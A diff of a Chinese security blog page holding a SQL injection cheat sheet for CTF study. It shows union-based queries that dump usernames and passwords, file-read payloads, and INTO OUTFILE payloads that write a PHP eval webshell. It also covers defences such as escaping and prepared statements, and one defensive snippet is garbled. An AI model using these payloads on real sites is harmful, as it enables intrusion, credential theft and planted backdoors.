@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://hackerqwq.github.io/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/13.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/14.png">
 <meta property="article:published_time" content="2021-02-28T05:22:32.000Z">
-<meta property="article:modified_time" content="2021-04-23T13:42:08.913Z">
+<meta property="article:modified_time" content="2021-06-15T03:25:25.967Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="sql">
@@ -302,7 +302,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">6.1k</span>Reading time: <span class="post-count reading-time">27 min</span></span>
+                        <span>Word count: <span class="post-count word-count">6.4k</span>Reading time: <span class="post-count reading-time">28 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -437,13 +437,24 @@ height:50vh;
 
 <h1 id="0x01-Mysql"><a href="#0x01-Mysql" class="headerlink" title="0x01 Mysql"></a>0x01 Mysql</h1><p>Mysql划分：权限 root 普通用户 版本 mysql&gt;5.0 mysql&lt;5.0</p>
 <h2 id="1-1-root权限"><a href="#1-1-root权限" class="headerlink" title="1.1 root权限"></a>1.1 root权限</h2><p>load_file和into outfile用户必须有FILE权限，并且还需要知道网站的绝对路径</p>
-<h3 id="1-1-1-判断是否具有读写权限"><a href="#1-1-1-判断是否具有读写权限" class="headerlink" title="1.1.1 判断是否具有读写权限"></a>1.1.1 判断是否具有读写权限</h3><p>初步判断当前用户是否对<code>mysql.user</code>表有访问权限：</p>
+<h3 id="1-1-1-判断是否具有读写权限"><a href="#1-1-1-判断是否具有读写权限" class="headerlink" title="1.1.1 判断是否具有读写权限"></a>1.1.1 判断是否具有读写权限</h3><ul>
+<li><p>初步判断当前用户是否对<code>mysql.user</code>表有访问权限：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span><span class="comment">#</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(file_priv) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p>解析：<strong>mysql.user</strong>的<strong>file_priv</strong>用于确定用户是否可以执行<strong>SELECT INTO OUTFILE</strong>和<strong>LOAD DATA INFILE</strong>命令,这两条语句也可以判断数据库用户数量<br>root用户执行的结果:<br><img src="/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/1.png"><br>test用户执行结果:<br><img src="/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/2.png"><br>可见低权限用户不能读取mysql.user表，那有读写权限的几率也小<br>更多mysql.user表的信息，包含创建用户，查看用户权限==&gt;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liuhaidon/archive/2019/09/12/11511129.html">https://www.cnblogs.com/liuhaidon/archive/2019/09/12/11511129.html</a></p>
+</li>
+<li><p>本地查看权限<br>通过SHOW VARIABLES LIKE “secure_file_priv”查看信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv&#x3D;null(不允许导入导出)</span><br><span class="line"></span><br><span class="line">mysqld --secure_file_priv&#x3D;&#x2F;tmp&#x2F;(导入导出只允许在&#x2F;tmp目录下)</span><br><span class="line"></span><br><span class="line">mysql  --secure_file_priv&#x3D;(任意导入导出)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
 <p>A、Load_file()用来读取文件，只能读取绝对路径的文件<br>注意:路径符号”\”错误  “\”正确  “/”正确，转换成十六进制，不用“”</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="keyword">load_file</span>（’/<span class="keyword">var</span>/www/index.php’）(物理路径转<span class="number">16</span>进制)</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="keyword">load_file</span>（<span class="number">0x2f7661722f7777772f696e6465782e706870</span>）</span><br></pre></td></tr></table></figure>
 <p>B、into outfile函数用来写文件，也是只能写绝对路径的文件</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot;</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;E:/study/WWW/evil.php&#x27;</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">&#x27;E:/study/WWW/evil.php&#x27;</span> <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="number">0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>C、通过FIELDS TERMINATED BY写入文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 into outfile &#x27;/var/lib/mysql-files/3.php&#x27; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>FIELDS TERMINATED BY</strong>为在输出数据的字段中添加<strong>FIELDS TERMINATED BY</strong>的内容，如果字段数为1，则无法进行添加，也就是说这个的限制条件是起码要有两个字段的。<br>D、LINES STARTING BY写入shell<br>用法与LINES TERMINATED BY一样，payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 into outfile &#x27;/var/lib/mysql-files/4.php&#x27; lines starting by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>
 <p>C、sqlnuke工具遍历可能存在写入权限的目录<br>有时会遇到不知道网站绝对路径的情况，这时候可以用<strong>github</strong>的<strong>sqlnuke</strong>工具，遍历字典文件查看可注入的点，也可以将字典文件载入<strong>burpsuite</strong>使用<br><a target="_blank" rel="noopener" href="https://github.com/nuke99/sqlnuke">地址</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nl_xYX5rd1UiIK4t9XYDuA">潇湘信安的教程</a></p>
 <h2 id="1-2-MySQL联合查询"><a href="#1-2-MySQL联合查询" class="headerlink" title="1.2 MySQL联合查询"></a>1.2 MySQL联合查询</h2><h3 id="1-2-1-适用于mysql低于5-0版本"><a href="#1-2-1-适用于mysql低于5-0版本" class="headerlink" title="1.2.1 适用于mysql低于5.0版本"></a>1.2.1 适用于mysql低于5.0版本</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.判断是否可以注入</span><br><span class="line">    ?id=1 and 1=1，页面正常</span><br><span class="line">    ?id=1 and 1=2，页面空白</span><br><span class="line">2.获得字段数</span><br><span class="line">order by的方法来判断，比如：</span><br><span class="line">    ?id=1 order by 4   页面显示正常</span><br><span class="line">    ?id=1 order by 5   页面出错，说明字段数等于4</span><br><span class="line">3.获得显示位</span><br><span class="line">    ?id=1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> </span><br><span class="line">    //比如，页面上出现了几个数字，分别是<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>，那么，这几个数字就被我们称作显示位。</span><br><span class="line"><span class="number">4.</span>猜表名</span><br><span class="line">    猜表名的方法是，在第三步的完整的地址后加上：<span class="keyword">Form</span> 表名，比如：</span><br><span class="line">        ?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line">    这样，当<span class="keyword">users</span>表存在的话，页面就会显示正常，如果我们提交一个不存在的表名，页面就会出错。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>猜字段</span><br><span class="line">    使用：<span class="keyword">Concat</span>(字段名)替换显示位的位置。</span><br><span class="line">        ?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>
 <h3 id="1-2-2-适用于Mysql-5-0以上版本支持查表查列"><a href="#1-2-2-适用于Mysql-5-0以上版本支持查表查列" class="headerlink" title="1.2.2 适用于Mysql 5.0以上版本支持查表查列"></a>1.2.2 适用于Mysql 5.0以上版本支持查表查列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1.先判断是否可以注入</span><br><span class="line">    and+1=1，页面正常</span><br><span class="line">    and+1=2，页面空白</span><br><span class="line">2.获得字段数：使用order by</span><br><span class="line">提交：</span><br><span class="line">    ?id=1 order by 4 正确。</span><br><span class="line">    ?id=1 order by 5 错误。</span><br><span class="line">    那么，判断出字段数为4。</span><br><span class="line">3.获得显示位</span><br><span class="line"></span><br><span class="line">提交：?id=1 +and+1=2+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">显示位为：<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span></span><br><span class="line"><span class="number">4.</span>获取信息</span><br><span class="line">    ?<span class="keyword">id</span>=<span class="number">1</span> +<span class="keyword">and</span>+<span class="number">1</span>=<span class="number">2</span>+<span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">version</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">database</span>() </span><br><span class="line">    <span class="keyword">user</span>()  </span><br><span class="line">    <span class="keyword">version</span>() </span><br><span class="line">    <span class="keyword">database</span>()  </span><br><span class="line">    @@basedir  数据库安装路径</span><br><span class="line">    @@datadir  数据库路径</span><br><span class="line"><span class="number">5.</span>查表</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x74657374</span>(数据库名<span class="keyword">test</span>的<span class="keyword">Hex</span>) <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--</span></span><br><span class="line">得到表：<span class="keyword">test</span></span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>查字段</span><br><span class="line">    ?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,column_name <span class="keyword">from</span> </span><br><span class="line">information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x74657374</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--</span></span><br><span class="line">    得到字段：<span class="keyword">id</span>，username，<span class="keyword">password</span></span><br><span class="line"><span class="number">7.</span>爆字段内容</span><br><span class="line">    ?<span class="keyword">id</span>=<span class="number">1</span>+<span class="keyword">and</span>+<span class="number">1</span>=<span class="number">2</span>+<span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span>+<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
@@ -713,12 +724,26 @@ height:50vh;
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">更多payload</a></p>
 <h1 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h1><p>基本思路：<strong>输入（解决数字型注入）——-转义处理（解决字符型注入）——-输出（解决数据库报错）</strong></p>
 <ol>
-<li>检查输入的数据是否具有所期望的数据格式。PHP 有很多可以用于检查输入的函数，从简单的变量函数和字符类<br>型函数（比如 <code>is_numeric()</code>，<code>ctype_digit()</code>）到复杂的 Perl 兼容正则表达式函数都可以完成这个工作。如果程序等待<br>输入一个数字，可以考虑使用 <code>is_numeric()</code> 来检查，或者直接使用 <code>settype()</code> 来转换它的类型，也可以用 <code>sprintf() </code>把<br>它格式化为数字。</li>
-<li>PHP内置转义函数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Addslashes() http:<span class="comment">//php.net/manual/zh/function.addslashes.php</span></span><br><span class="line">magic_quote_gpc http:<span class="comment">//php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc</span></span><br><span class="line">mysql_real_escape_string() http:<span class="comment">//php.net/manual/zh/function.mysql-real-escape-string.php</span></span><br><span class="line">mysql_escape_string() http:<span class="comment">//php.net/manual/zh/function.mysql-escape-string.php</span></span><br></pre></td></tr></table></figure></li>
-<li>数据库报错信息泄露防范：<br>把<code>php.ini</code>文件<code>display_errors = Off</code><br>数据库查询函数前面加一个<code>@</code>字符<br>最有效可预防SQL注入攻击的防御方式：预处理技术进行数据库查询：<br>代码示例：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> MySQLi(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!$mysqli)&#123;</span><br><span class="line"><span class="keyword">die</span>($mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from users where id=?&quot;</span>;<span class="comment">////创建一个预定义的对象 ?占位</span></span><br><span class="line">$mysqli_stmt = $mysqli-&gt;prepare($sql);</span><br><span class="line">$id=$_REQUEST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$mysqli_stmt-&gt;bind_param(<span class="string">&quot;i&quot;</span>,$id);<span class="comment">////绑定参数</span></span><br><span class="line">$mysqli_stmt-&gt;bind_result($id,$username,$password);<span class="comment">////绑定结果集</span></span><br><span class="line">$mysqli_stmt-&gt;execute();<span class="comment">//执行</span></span><br><span class="line"><span class="keyword">while</span>($mysqli_stmt-&gt;fetch())&#123; <span class="comment">//取出绑定的结果集</span></span><br><span class="line"><span class="keyword">echo</span> $id.<span class="string">&quot; &quot;</span>.$username .<span class="string">&quot; &quot;</span>. $password;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$mysqli_stmt-&gt;free_result(); <span class="comment">////关闭结果集</span></span><br><span class="line">$mysqli_stmt-&gt;close();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<li><p>检查输入的数据是否具有所期望的数据格式。PHP 有很多可以用于检查输入的函数，从简单的变量函数和字符类<br>型函数（比如 <code>is_numeric()</code>，<code>ctype_digit()</code>）到复杂的 Perl 兼容正则表达式函数都可以完成这个工作。如果程序等待<br>输入一个数字，可以考虑使用 <code>is_numeric()</code> 来检查，或者直接使用 <code>settype()</code> 来转换它的类型，也可以用 <code>sprintf() </code>把<br>它格式化为数字。</p>
+</li>
+<li><p>PHP内置转义函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Addslashes() http:<span class="comment">//php.net/manual/zh/function.addslashes.php</span></span><br><span class="line">magic_quote_gpc http:<span class="comment">//php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc</span></span><br><span class="line">mysql_real_escape_string() http:<span class="comment">//php.net/manual/zh/function.mysql-real-escape-string.php</span></span><br><span class="line">mysql_escape_string() http:<span class="comment">//php.net/manual/zh/function.mysql-escape-string.php</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数据库报错信息泄露防范：<br>把<code>php.ini</code>文件<code>display_errors = Off</code><br>数据库查询函数前面加一个<code>@</code>字符</p>
+</li>
+<li><p>防止二次注入</p>
 </li>
 </ol>
+<ul>
+<li>方案一：指定php连接mysql的字符集<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql_set_charset(<span class="string">&#x27;gbk&#x27;</span>,$conn);</span><br><span class="line">_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br></pre></td></tr></table></figure></li>
+<li>方案二：将character_set_client设置为binary（二进制）<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;</span>,</span><br><span class="line">$conn);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>最有效可预防SQL注入攻击的防御方式：预<strong>处理技术进行数据库查询</strong></p>
+<p>代码示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> MySQLi(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!$mysqli)&#123;</span><br><span class="line"><span class="keyword">die</span>($mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">&quot;select id,username,password from users where id=?&quot;</span>;<span class="comment">////创建一个预定义的对象 ?占位</span></span><br><span class="line">$mysqli_stmt = $mysqli-&gt;prepare($sql);</span><br><span class="line">$id=$_REQUEST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$mysqli_stmt-&gt;bind_param(<span class="string">&quot;i&quot;</span>,$id);<span class="comment">////绑定参数</span></span><br><span class="line">$mysqli_stmt-&gt;bind_result($id,$username,$password);<span class="comment">////绑定结果集</span></span><br><span class="line">$mysqli_stmt-&gt;execute();<span class="comment">//执行</span></span><br><span class="line"><span class="keyword">while</span>($mysqli_stmt-&gt;fetch())&#123; <span class="comment">//取出绑定的结果集</span></span><br><span class="line"><span class="keyword">echo</span> $id.<span class="string">&quot; &quot;</span>.$username .<span class="string">&quot; &quot;</span>. $password;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$mysqli_stmt-&gt;free_result(); <span class="comment">////关闭结果集</span></span><br><span class="line">$mysqli_stmt-&gt;close();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
 <li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/07/5deb12bee9a98/?__cf_chl_jschl_tk__=8ae3404b75fabdde0fe82de288e5e73b283956ca-1614510870-0-AUjQIr3zdwr2q26z_fVFzk9N1q_ZkVsYoov6XPJp9BSOU5EK2s34RXQnkQUz6wFzMss2NwTPgKJmeaP2eXW_JRGK1l1ZoVEHk93fkTnH__bKOcCvxAVNlMpugEPuPFt6HMsmF2kQxBavbegTfJicX3k-IqzVA2CAUAbjKoY2Tx3nm0UKp8KICuOr22SjeK_X417FYhR44OwbVyBjYfYnj_OuFHzrzNJ8T3zwUy-emfsAB7fT89H4UBfJlQApCw2CLWb-RVdLbZnvVXXXDk9yG26tnCnXl72eOEtBdi4ASCXbDF8hSSg1ulFBAdi9K-PiMM3jE4VZ2x3b-YF0CF_3cz0">SQL注入之sqlserver注入</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/200154#h2-13">SQLServer数据库注入详解</a></li>
@@ -2100,118 +2125,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 86
+        Total : 89
         </div>
         <!-- search  -->
         
@@ -2231,42 +2147,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2021/04/24/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%B0%8F%E7%AC%94%E8%AE%B0/" >弱类型比较小笔记</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/" >代码执行小总结</a>
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href= "/2021/05/16/2021CISCNweb%E6%80%BB%E7%BB%93/" >2021CISCNweb总结</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">04/20</span><a class="archive-post-title" href= "/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/" >nodejs利用小总结</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2021/04/19/redis%E6%94%BB%E9%98%B2%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >redis攻防利用面总结</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2021/04/17/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84-NU1L%E7%9A%84%E4%B9%A6/" >文件读取漏洞常见读取路径(NU1L的书)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2021/04/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/" >文件上传反序列化getshell-[强网杯 2019]Upload</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2021/04/09/%E8%AF%BB%E5%8F%96%E5%8F%98%E9%87%8Fgetflag-BJDCTF2020-EzPHP/" >读取变量getflag-[BJDCTF2020]EzPHP</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/08</span><a class="archive-post-title" href= "/2021/04/08/sql%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5/" >sql绕过过滤速查</a>
         </li>
     
     
@@ -2281,27 +2167,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2021/04/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/" >内网渗透-信息收集篇</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2021/03/26/Nep2021%E4%B8%AA%E4%BA%BA%E8%B5%9B%E6%80%BB%E7%BB%93-wp-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" >Nep2021个人赛总结&wp(学习笔记)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/28</span><a class="archive-post-title" href= "/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/" >sql注入速查笔记</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2021/02/27/XSS%E7%9A%84payload%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" >XSS的payload和绕过总结</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2021/02/23/python%E5%BA%93Pillow%E7%9A%84%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95/" >python库Pillow的常见用法</a>
         </li>
     
     
@@ -2320,62 +2186,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
